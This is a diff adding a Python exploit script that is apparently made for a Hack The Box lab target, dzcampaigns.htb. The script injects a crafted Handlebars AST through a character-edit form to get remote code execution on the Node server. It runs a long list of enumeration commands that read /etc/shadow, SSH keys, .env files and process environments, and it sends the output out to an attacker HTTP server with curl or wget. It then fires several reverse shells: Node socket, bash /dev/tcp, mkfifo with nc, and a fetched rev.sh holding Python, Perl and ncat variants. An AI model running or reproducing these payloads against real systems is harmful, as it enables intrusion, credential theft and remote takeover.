@@ -1,1 +1,746 @@
+#!/usr/bin/env python3
+# dz_enum_rev.py
+# Full enumeration + reverse shell delivery for dzcampaigns.htb Handlebars AST RCE
+
+#nc -lvnp 4444
+
+ #python3 dz_enum_rev.py \
+ # --target http://dzcampaigns.htb \
+ # --cookie 'dz.sid=s%3ANC4Cy-uY36y9atzGi60BCa9Ky3FQH6Y5.tbGB9hdsmtasEPb1zDfYD34ekj9i4vMuZR1mZWc3ALo' \
+ # --character-id 16 \
+ # --lhost 10.10.16.50 \
+ # --http-port 9001 \
+ # --rev-port 4444 \
+ # --mode all
+
+import argparse
+import base64
+import html
+import http.server
+import json
+import os
+import re
+import secrets
+import socketserver
+import threading
+import time
+
+import requests
+import urllib3
+
+urllib3.disable_warnings()
+
+PROXIES = None
+UA = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
+
+EXFILDIR = "dz_exfil"
+DEBUGDIR = "dz_enum_rev_debug"
+REV_SCRIPT = ""
+
+
+def rand_marker(prefix="DZ"):
+    return prefix + secrets.token_hex(4).upper()
+
+
+def b64(s):
+    return base64.b64encode(s.encode()).decode()
+
+
+def clean(text, limit=2200):
+    if not text:
+        return ""
+    return re.sub(r"\s+", " ", text).strip()[:limit]
+
+
+def around(text, term, before=300, after=1900):
+    i = text.find(term)
+    if i == -1:
+        return text[:2200]
+    start = max(0, i - before)
+    end = min(len(text), i + after)
+    return text[start:end]
+
+
+def set_cookies(session, cookie_header):
+    for part in cookie_header.split(";"):
+        part = part.strip()
+        if not part or "=" not in part:
+            continue
+        k, v = part.split("=", 1)
+        session.cookies.set(k.strip(), v.strip())
+
+
+def scrape_csrf(session, args):
+    url = args.target.rstrip("/") + f"/character/{args.character_id}/edit"
+
+    try:
+        r = session.get(url, timeout=args.timeout, verify=False, proxies=PROXIES)
+
+        patterns = [
+            r'name="_csrf"\s+value="([^"]+)"',
+            r'value="([^"]+)"\s+name="_csrf"',
+            r"name='_csrf'\s+value='([^']+)'",
+            r"value='([^']+)'\s+name='_csrf'",
+            r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)',
+            r'<meta[^>]+content=["\']([^"\']+)["\'][^>]+name=["\']csrf-token["\']'
+        ]
+
+        for pat in patterns:
+            m = re.search(pat, r.text, re.I)
+            if m:
+                return m.group(1)
+
+        print(f"[-] CSRF token not found on {url}")
+        print(f"    status={r.status_code}")
+        print(f"    snippet={clean(r.text, 500)}")
+
+    except Exception as e:
+        print(f"[-] CSRF scrape failed: {e}")
+
+    return args.csrf
+
+
+def get_csrf(session, args, force=False):
+    if args.csrf and not force:
+        return args.csrf
+
+    if force or not getattr(args, "_csrf_cache", None):
+        args._csrf_cache = scrape_csrf(session, args)
+
+    return args._csrf_cache
+
+
+def check_auth(session, args):
+    try:
+        r = session.get(
+            args.target.rstrip("/") + "/dashboard",
+            timeout=args.timeout,
+            verify=False,
+            proxies=PROXIES
+        )
+
+        print(f"[*] Auth check /dashboard :: status={r.status_code}")
+
+        if "logout" in r.text.lower():
+            m = re.search(r'<span class="user-greeting">\s*—\s*([^<]+?)\s*</span>', r.text)
+            if m:
+                print(f"[+] Authenticated as: {m.group(1)}")
+            else:
+                print("[+] Authenticated: logout form found")
+        else:
+            print("[!] Authentication may be invalid. Cookie may be expired.")
+            print(f"    snippet: {clean(r.text, 500)}")
+
+    except Exception as e:
+        print(f"[-] Auth check failed: {e}")
+
+
+class ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
+    daemon_threads = True
+    allow_reuse_address = True
+
+
+class ExfilHandler(http.server.BaseHTTPRequestHandler):
+    def _save(self, body):
+        name = self.path.split("?")[0].strip("/") or "root"
+        safe = re.sub(r"[^A-Za-z0-9._-]", "_", name)
+
+        if safe in ("rev.sh", "r", "r.sh", "favicon.ico"):
+            return
+
+        os.makedirs(EXFILDIR, exist_ok=True)
+        fname = os.path.join(EXFILDIR, safe)
+
+        with open(fname, "ab") as f:
+            f.write(body)
+
+        print(f"[HTTP] Saved {len(body)} bytes -> {fname}")
+
+    def _reply(self, body=b"ok", ctype="text/plain"):
+        self.send_response(200)
+        self.send_header("Content-Type", ctype)
+        self.send_header("Content-Length", str(len(body)))
+        self.end_headers()
+        self.wfile.write(body)
+
+    def do_GET(self):
+        path = self.path.split("?")[0]
+
+        if path in ("/rev.sh", "/r", "/r.sh"):
+            self._reply(REV_SCRIPT.encode(), "text/plain")
+        else:
+            self._save(b"")
+            self._reply()
+
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length", 0) or 0)
+        body = self.rfile.read(length) if length else b""
+        self._save(body)
+        self._reply()
+
+    def log_message(self, *args):
+        pass
+
+
+def start_http_server(port):
+    try:
+        srv = ThreadingHTTPServer(("0.0.0.0", port), ExfilHandler)
+        t = threading.Thread(target=srv.serve_forever, daemon=True)
+        t.start()
+        print(f"[*] HTTP exfil / rev.sh server listening on 0.0.0.0:{port}")
+        return srv
+    except Exception as e:
+        print(f"[-] Could not start HTTP server on port {port}: {e}")
+        print("    Make sure you are not running nc on that port.")
+        return None
+
+
+def wait_exfil(token, timeout=8):
+    fname = os.path.join(EXFILDIR, token)
+    end = time.time() + timeout
+
+    while time.time() < end:
+        if os.path.exists(fname) and os.path.getsize(fname) > 0:
+            return fname
+        time.sleep(0.2)
+
+    return None
+
+
+def inject_shell(shell):
+    enc = b64(shell)
+
+    return (
+        "(function(){"
+        "var G=typeof globalThis!=='undefined'?globalThis:global;"
+        "var B=G.Buffer||Buffer;"
+        f"var c=B.from('{enc}','base64').toString();"
+        "try{return process.getBuiltinModule('child_process').execFileSync('/bin/sh',['-c',c]).toString()}"
+        "catch(e){"
+        "try{return process.mainModule.require('child_process').execSync(c).toString()}"
+        "catch(e2){"
+        "try{return G.require('child_process').execSync(c).toString()}"
+        "catch(e3){return 'ERR:'+e}"
+        "}"
+        "}"
+        "})()"
+    )
+
+
+def inject_reverse_node(lhost, lport):
+    return (
+        "(function(){"
+        "var G=typeof globalThis!=='undefined'?globalThis:global;"
+        "var r;"
+        "try{r=process.getBuiltinModule.bind(process)}catch(e){}"
+        "if(!r){try{r=process.mainModule.require.bind(process.mainModule)}catch(e2){}}"
+        "if(!r){try{r=G.require}catch(e3){}}"
+        "try{"
+        "var cp=r('child_process');"
+        "var net=r('net');"
+        "var sh=cp.spawn('/bin/sh',['-i']);"
+        "var c=new net.Socket();"
+        "c.on('error',function(){});"
+        "sh.on('error',function(){});"
+        f"c.connect({int(lport)},'{lhost}',function(){{"
+        "c.pipe(sh.stdin);"
+        "sh.stdout.pipe(c);"
+        "sh.stderr.pipe(c);"
+        "});"
+        "return 'REV'"
+        "}catch(e){return 'ERR:'+e}"
+        "})()"
+    )
+
+
+def make_ast(expr):
+    value = "{},{})) + " + expr + " //"
+
+    return {
+        "type": "Program",
+        "body": [
+            {
+                "type": "MustacheStatement",
+                "path": {
+                    "type": "PathExpression",
+                    "data": False,
+                    "depth": 0,
+                    "parts": ["lookup"],
+                    "original": "lookup",
+                    "loc": None
+                },
+                "params": [
+                    {
+                        "type": "StringLiteral",
+                        "value": "a",
+                        "original": "a",
+                        "loc": None
+                    },
+                    {
+                        "type": "NumberLiteral",
+                        "value": value,
+                        "original": 1,
+                        "loc": None
+                    }
+                ],
+                "escaped": True,
+                "strip": {"open": False, "close": False},
+                "loc": None
+            }
+        ]
+    }
+
+
+def post_ast(session, args, expr):
+    csrf = get_csrf(session, args)
+
+    if not csrf:
+        return None, None
+
+    url = args.target.rstrip("/") + f"/character/{args.character_id}"
+
+    headers = {
+        "Referer": args.target.rstrip("/") + f"/character/{args.character_id}/edit",
+        "Content-Type": "application/json"
+    }
+
+    payload = {
+        "_csrf": csrf,
+        "name": args.name,
+        "race": args.race,
+        "class": args.char_class,
+        "backstory": args.backstory,
+        "campaign_message": make_ast(expr)
+    }
+
+    try:
+        r = session.post(
+            url,
+            json=payload,
+            headers=headers,
+            allow_redirects=True,
+            timeout=args.timeout,
+            verify=False,
+            proxies=PROXIES
+        )
+    except Exception as e:
+        print(f"[-] POST failed: {e}")
+        return None, payload
+
+    if r.status_code == 403:
+        csrf = get_csrf(session, args, force=True)
+
+        if csrf:
+            payload["_csrf"] = csrf
+
+            try:
+                r = session.post(
+                    url,
+                    json=payload,
+                    headers=headers,
+                    allow_redirects=True,
+                    timeout=args.timeout,
+                    verify=False,
+                    proxies=PROXIES
+                )
+            except Exception as e:
+                print(f"[-] POST retry failed: {e}")
+                return None, payload
+
+    return r, payload
+
+
+def fetch_pages(session, args):
+    paths = [
+        "/",
+        f"/campaign/{args.campaign_id}",
+        f"/character/{args.character_id}",
+        f"/character/{args.character_id}/edit"
+    ]
+
+    out = []
+
+    for path in paths:
+        try:
+            url = args.target.rstrip("/") + path
+            url += ("?" if "?" not in url else "&") + "z=" + rand_marker("Z")
+
+            r = session.get(
+                url,
+                timeout=args.timeout,
+                verify=False,
+                proxies=PROXIES
+            )
+
+            out.append((path, r.text))
+
+        except Exception as e:
+            out.append((path, f"ERROR {e}"))
+
+    return out
+
+
+def save_debug(name, payload, pages):
+    os.makedirs(DEBUGDIR, exist_ok=True)
+    fname = os.path.join(DEBUGDIR, name + ".html")
+
+    combined = "### PAYLOAD\n"
+    combined += json.dumps(payload, indent=2)
+    combined += "\n\n"
+
+    for source, body in pages:
+        combined += f"### SOURCE: {source}\n{body}\n\n"
+
+    with open(fname, "w", encoding="utf-8", errors="ignore") as f:
+        f.write(combined)
+
+    return fname
+
+
+def extract_token_block(text, token):
+    un = html.unescape(text)
+
+    matches = re.findall(
+        re.escape(token) + r"(.*?)" + re.escape(token),
+        un,
+        re.S | re.I
+    )
+
+    if matches:
+        return clean(matches[-1], 4000)
+
+    return None
+
+
+def find_term(pages, terms):
+    for source, text in pages:
+        un = html.unescape(text)
+
+        for term in terms:
+            if term in un:
+                return clean(around(un, term), 3000), source, term
+
+    return None, None, None
+
+
+def run_expr(session, args, name, expr, terms):
+    print(f"\n[*] {name} :: sending AST expression")
+
+    r, payload = post_ast(session, args, expr)
+
+    if not r:
+        print(f"[-] {name} :: no response")
+        return False
+
+    time.sleep(args.delay)
+
+    pages = [(f"POST_FINAL {r.status_code} {r.url}", r.text)]
+    pages += fetch_pages(session, args)
+
+    fname = save_debug(name, payload, pages)
+
+    snippet, source, term = find_term(pages, terms)
+
+    if snippet:
+        print(f"[+] {name} :: http={r.status_code} term={term} source={source} file={fname}")
+        print(f"    snippet: {snippet[:1600]}")
+        return True
+
+    print(f"[-] {name} :: http={r.status_code} file={fname}")
+    return False
+
+
+def run_cmd(session, args, name, cmd):
+    token = rand_marker("T")
+
+    shell = (
+        "D=/dev/shm; [ -w \"$D\" ] || D=/tmp; "
+        f"F=\"$D/{token}\"; "
+        f"echo {token}; "
+        f"({cmd}) > \"$F\" 2>&1; "
+        "head -c 900 \"$F\"; "
+        f"echo {token}; "
+        f"curl -s --max-time 8 -X POST --data-binary @\"$F\" http://{args.lhost}:{args.http_port}/{token} "
+        f"|| wget -q --timeout=8 --post-file=\"$F\" http://{args.lhost}:{args.http_port}/{token} "
+        "|| true"
+    )
+
+    expr = inject_shell(shell)
+
+    print(f"\n[*] {name} :: {cmd[:120]}")
+
+    r, payload = post_ast(session, args, expr)
+
+    if not r:
+        print(f"[-] {name} :: no response")
+        return False
+
+    time.sleep(args.delay)
+
+    pages = [(f"POST_FINAL {r.status_code} {r.url}", r.text)]
+    pages += fetch_pages(session, args)
+
+    fname = save_debug(name, payload, pages)
+
+    block = None
+
+    for source, text in pages:
+        block = extract_token_block(text, token)
+        if block:
+            break
+
+    exfil_file = wait_exfil(token, timeout=8)
+
+    print(f"[*] {name} :: http={r.status_code} debug={fname}")
+
+    if exfil_file:
+        try:
+            with open(exfil_file, "r", encoding="utf-8", errors="ignore") as f:
+                content = f.read()
+
+            print(f"[+] {name} :: exfil saved -> {exfil_file} ({len(content)} bytes)")
+            print("---- OUTPUT ----")
+            print(content[:8000])
+            print("---- END ----")
+
+        except Exception as e:
+            print(f"[-] {name} :: could not read exfil file: {e}")
+
+    elif block:
+        print(f"[+] {name} :: web output only")
+        print("---- WEB OUTPUT ----")
+        print(block[:8000])
+        print("---- END ----")
+
+    else:
+        print(f"[-] {name} :: no output captured")
+
+    return bool(exfil_file or block)
+
+
+def build_rev_script(lhost, http_port, rev_port):
+    return f"""#!/bin/bash
+# rev.sh served by dz_enum_rev.py
+
+LHOST="{lhost}"
+HTTP_PORT="{http_port}"
+REV_PORT="{rev_port}"
+
+# 1. Bash /dev/tcp
+(bash -i >& /dev/tcp/$LHOST/$REV_PORT 0>&1 &) || true
+
+# 2. sh /dev/tcp if supported
+(sh -i >& /dev/tcp/$LHOST/$REV_PORT 0>&1 &) || true
+
+# 3. mkfifo + nc
+(rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $LHOST $REV_PORT > /tmp/f &) || true
+
+# 4. ncat if present
+(ncat $LHOST $REV_PORT -e /bin/sh &) || true
+
+# 5. Python3
+(python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LHOST",$REV_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' &) || true
+
+# 6. Perl
+(perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($REV_PORT,inet_aton("$LHOST")))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' &) || true
+
+# 7. Node if available
+(node -e 'var r=process.mainModule.require;var cp=r("child_process");var net=r("net");var sh=cp.spawn("/bin/sh",["-i"]);var c=new net.Socket();c.on("error",function(){{}});sh.on("error",function(){{}});c.connect($REV_PORT,"$LHOST",function(){{c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);}});' &) || true
+
+exit 0
+"""
+
+
+def enumeration_commands():
+    return [
+        ("basic", "id; hostname; whoami; pwd; uname -a; cat /etc/os-release 2>/dev/null | head -n 8"),
+
+        ("net", "ip a 2>/dev/null || ifconfig -a; echo '---ROUTE---'; ip route 2>/dev/null || route -n; echo '---HOSTS---'; cat /etc/hosts; echo '---RESOLV---'; cat /etc/resolv.conf"),
+
+        ("fs_root", "ls -la /; echo '---OPT---'; ls -la /opt; echo '---APP---'; ls -la /opt/DarkZero_Campaigns 2>/dev/null; echo '---APP_HIDDEN---'; ls -la /opt/DarkZero_Campaigns/.* 2>/dev/null | head -n 100"),
+
+        ("app_config", "cat /opt/DarkZero_Campaigns/package.json 2>/dev/null; echo '---ENV---'; cat /opt/DarkZero_Campaigns/.env 2>/dev/null; echo '---ENV2---'; cat /opt/.env 2>/dev/null; echo '---CONFIG---'; cat /opt/DarkZero_Campaigns/config* 2>/dev/null | head -c 5000"),
+
+        ("app_files", "timeout 20 find /opt/DarkZero_Campaigns -maxdepth 2 -type f \\( -name '*.js' -o -name '*.json' -o -name '*.env' -o -name '*.conf' -o -name '*.yml' -o -name '*.yaml' -o -name '*.sqlite*' -o -name '*.db' -o -name '*.pem' -o -name '*.key' \\) -exec ls -la {} \\; 2>/dev/null | head -n 250"),
+
+        ("app_source", "cat /opt/DarkZero_Campaigns/server.js 2>/dev/null | head -c 5000; echo '---APPJS---'; cat /opt/DarkZero_Campaigns/app.js 2>/dev/null | head -c 5000; echo '---INDEXJS---'; cat /opt/DarkZero_Campaigns/index.js 2>/dev/null | head -c 5000"),
+
+        ("app_grep", "timeout 25 grep -R --exclude-dir=node_modules -E 'password|secret|token|key|flag|user|database|mysql|postgres|mongo|redis|ldap|sssd' /opt/DarkZero_Campaigns --include='*.js' --include='*.json' --include='*.env' --include='*.yml' --include='*.yaml' --include='*.conf' 2>/dev/null | head -n 200"),
+
+        ("git", "ls -la /opt/DarkZero_Campaigns/.git 2>/dev/null; cat /opt/DarkZero_Campaigns/.git/config 2>/dev/null; cat /opt/DarkZero_Campaigns/.git/HEAD 2>/dev/null"),
+
+        ("proc_env", "env; echo '---PROC_SELF---'; cat /proc/self/environ 2>/dev/null | tr '\\0' '\\n'; echo '---PROC_OTHER---'; for p in /proc/[0-9]*/environ; do echo \"$p\"; cat \"$p\" 2>/dev/null | tr '\\0' '\\n' | head -n 20; done | head -n 250"),
+
+        ("processes", "ps auxww 2>/dev/null | head -n 120"),
+
+        ("ports", "ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null; echo '---ANP---'; ss -anp 2>/dev/null | head -n 120"),
+
+        ("sudo_caps", "sudo -l 2>/dev/null; echo '---CAPS---'; getcap -r / 2>/dev/null | head -n 80"),
+
+        ("suid", "timeout 25 find / -xdev -perm -4000 -type f 2>/dev/null | head -n 120"),
+
+        ("writable_dirs", "timeout 25 find / -xdev -writable -type d 2>/dev/null | grep -v -E '^/(proc|sys|dev|run)' | head -n 150"),
+
+        ("cron", "ls -la /etc/cron* 2>/dev/null; echo '---CRONTAB---'; cat /etc/crontab 2>/dev/null; echo '---SPOOL---'; ls -la /var/spool/cron/crontabs 2>/dev/null; echo '---TIMERS---'; timeout 10 systemctl list-timers --all --no-pager 2>/dev/null | head -n 60"),
+
+        ("services", "timeout 15 systemctl list-units --type=service --all --no-pager 2>/dev/null | head -n 120"),
+
+        ("home_flags", "ls -la /home 2>/dev/null; echo '---HOME_USERS---'; ls -la /home/* 2>/dev/null; echo '---USER_FLAG---'; cat /home/*/user.txt 2>/dev/null; echo '---ROOT_FLAG---'; cat /root/root.txt 2>/dev/null; echo '---FIND_FLAGS---'; timeout 20 find / -xdev -name 'user.txt' -o -name 'root.txt' -o -name '*flag*' 2>/dev/null | head -n 100"),
+
+        ("passwd_group", "cat /etc/passwd; echo '---GROUP---'; cat /etc/group; echo '---SHADOW---'; cat /etc/shadow 2>&1 | head -n 5"),
+
+        ("ssh", "ls -la ~/.ssh 2>/dev/null; echo '---SSH_KEYS---'; cat ~/.ssh/* 2>/dev/null; echo '---ETC_SSH---'; ls -la /etc/ssh 2>/dev/null; echo '---SSHD_CONFIG---'; cat /etc/ssh/sshd_config 2>/dev/null | head -n 120; echo '---FIND_AUTHKEYS---'; timeout 20 find / -xdev -name authorized_keys 2>/dev/null | head -n 50; echo '---FIND_IDRSA---'; timeout 20 find / -xdev -name 'id_rsa*' -o -name '*.pem' -o -name '*.ppk' 2>/dev/null | head -n 80"),
+
+        ("mysql", "mysql --version 2>/dev/null; echo '---MYCNF---'; cat ~/.my.cnf 2>/dev/null; cat /opt/DarkZero_Campaigns/.my.cnf 2>/dev/null; echo '---MYSQL_TRY---'; mysql -u root -e 'select @@version; show databases;' 2>&1 | head -n 50; echo '---MYSQL_DARKZERO---'; mysql -u darkzero -e 'select @@version; show databases;' 2>&1 | head -n 50"),
+
+        ("mysql_files", "ls -la /var/lib/mysql 2>/dev/null | head -n 100; echo '---MYSQL_LOGS---'; ls -la /var/log/mysql* 2>/dev/null | head -n 50"),
+
+        ("sssd_ad", "cat /etc/sssd/sssd.conf 2>/dev/null; echo '---KRB5---'; cat /etc/krb5.conf 2>/dev/null; echo '---REALM---'; realm list 2>/dev/null; echo '---SSS_DIR---'; ls -la /var/lib/sss 2>/dev/null | head -n 80"),
+
+        ("backups_logs", "ls -la /var/backups 2>/dev/null; echo '---LOG---'; ls -la /var/log 2>/dev/null | head -n 100"),
+
+        ("tools", "which bash sh nc ncat netcat python3 python perl php node curl wget gcc socat gdb strace ltrace openssl base64 xxd telnet 2>/dev/null"),
+
+        ("tmp_shm", "ls -la /tmp /dev/shm /var/tmp 2>/dev/null"),
+
+        ("fstab_mount", "cat /etc/fstab 2>/dev/null; echo '---MOUNT---'; mount 2>/dev/null | head -n 80; echo '---DF---'; df -h 2>/dev/null"),
+
+        ("arp_internal", "cat /proc/net/arp 2>/dev/null; echo '---FIB---'; cat /proc/net/fib_trie 2>/dev/null | head -n 120")
+    ]
+
+
+def do_enumeration(session, args):
+    print("\n" + "=" * 90)
+    print("ENUMERATION PHASE")
+    print("=" * 90)
+
+    for name, cmd in enumeration_commands():
+        run_cmd(session, args, name, cmd)
+        time.sleep(args.delay)
+
+
+def do_reverse(session, args):
+    print("\n" + "=" * 90)
+    print("REVERSE SHELL PHASE")
+    print("=" * 90)
+    print(f"[*] Make sure your listener is running: nc -lvnp {args.rev_port}")
+    print(f"[*] HTTP rev.sh is served on: http://{args.lhost}:{args.http_port}/rev.sh")
+
+    # 1. Node in-process reverse shell
+    run_expr(
+        session,
+        args,
+        "rev_node_inproc",
+        inject_reverse_node(args.lhost, args.rev_port),
+        ["REV", "ERR"]
+    )
+
+    # 2. Download and execute rev.sh
+    shell = (
+        f"curl -s --max-time 8 http://{args.lhost}:{args.http_port}/rev.sh -o /tmp/r.sh "
+        f"|| wget -q --timeout=8 http://{args.lhost}:{args.http_port}/rev.sh -O /tmp/r.sh; "
+        "(setsid bash /tmp/r.sh >/dev/null 2>&1 &) ; "
+        "echo REVSH"
+    )
+
+    run_expr(session, args, "rev_curl_script", inject_shell(shell), ["REVSH"])
+
+    # 3. Bash /dev/tcp direct
+    shell = (
+        "( (setsid bash -c "
+        f"'bash -i >& /dev/tcp/{args.lhost}/{args.rev_port} 0>&1' "
+        "|| bash -c "
+        f"'bash -i >& /dev/tcp/{args.lhost}/{args.rev_port} 0>&1'"
+        ") >/dev/null 2>&1 &) ; echo REVSH"
+    )
+
+    run_expr(session, args, "rev_bash_dev_tcp", inject_shell(shell), ["REVSH"])
+
+    # 4. mkfifo + nc direct
+    shell = (
+        "( (setsid sh -c "
+        f"'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {args.lhost} {args.rev_port} > /tmp/f' "
+        "|| sh -c "
+        f"'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {args.lhost} {args.rev_port} > /tmp/f'"
+        ") >/dev/null 2>&1 &) ; echo REVSH"
+    )
+
+    run_expr(session, args, "rev_mkfifo_nc", inject_shell(shell), ["REVSH"])
+
+    print("\n[*] Reverse payloads sent.")
+    print("[*] If a shell connects, stabilize it with:")
+    print("    python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
+    print("    Ctrl-Z")
+    print("    stty raw -echo; fg")
+    print("    export TERM=xterm")
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Enumeration + reverse shell for dzcampaigns.htb Handlebars AST RCE"
+    )
+
+    parser.add_argument("--target", required=True)
+    parser.add_argument("--cookie", required=True)
+    parser.add_argument("--character-id", required=True)
+    parser.add_argument("--campaign-id", default="1")
+    parser.add_argument("--csrf", default="")
+    parser.add_argument("--name", default="Name")
+    parser.add_argument("--race", default="Race")
+    parser.add_argument("--char-class", default="Class")
+    parser.add_argument("--backstory", default="Backstory")
+    parser.add_argument("--lhost", required=True, help="Your tun0 IP")
+    parser.add_argument("--http-port", type=int, default=9001, help="HTTP exfil / rev.sh port")
+    parser.add_argument("--rev-port", type=int, default=4444, help="Reverse shell listener port")
+    parser.add_argument("--mode", default="all", help="all, enum, rev")
+    parser.add_argument("--timeout", type=int, default=35)
+    parser.add_argument("--delay", type=float, default=0.8)
+    parser.add_argument("--proxy", default="")
+
+    args = parser.parse_args()
+
+    global PROXIES, REV_SCRIPT, EXFILDIR, DEBUGDIR
+
+    if args.proxy:
+        PROXIES = {
+            "http": args.proxy,
+            "https": args.proxy
+        }
+
+    os.makedirs(EXFILDIR, exist_ok=True)
+    os.makedirs(DEBUGDIR, exist_ok=True)
+
+    REV_SCRIPT = build_rev_script(args.lhost, args.http_port, args.rev_port)
+
+    session = requests.Session()
+
+    session.headers.update({
+        "User-Agent": UA,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+    })
+
+    set_cookies(session, args.cookie)
+
+    check_auth(session, args)
+
+    start_http_server(args.http_port)
+
+    modes = set(args.mode.split(","))
+
+    if "all" in modes:
+        modes = {"enum", "rev"}
+
+    if "enum" in modes:
+        do_enumeration(session, args)
+
+    if "rev" in modes:
+        do_reverse(session, args)
+
+    print("\n[+] Done.")
+    print(f"[*] Exfil directory: {os.path.abspath(EXFILDIR)}")
+    print(f"[*] Debug directory: {os.path.abspath(DEBUGDIR)}")
+
+
+if __name__ == "__main__":
+    main()
 
